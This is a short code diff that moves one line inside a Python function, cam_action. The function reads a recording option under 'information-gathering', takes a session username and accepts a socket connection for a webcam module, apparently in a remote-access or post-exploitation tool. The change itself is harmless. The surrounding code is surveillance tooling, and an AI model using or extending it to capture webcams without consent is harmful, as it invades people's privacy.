@@ -23,9 +23,8 @@ def cam_action(resolution, recognize, fit):
 		username = state['session']['username']
 		mode = [True, 0, b'']
 
-		record = state['options']['information-gathering']['record']['cam-stream']
 		cam_id = random.randint(0, 100000)
-
+		record = state['options']['information-gathering']['record']['cam-stream']
 		client, addr = state['sockets']['modules']['cam'][0].accept()
 		client_obj = (client, username, addr)
 		state['sockets']['modules']['cam'][1].append(client_obj)
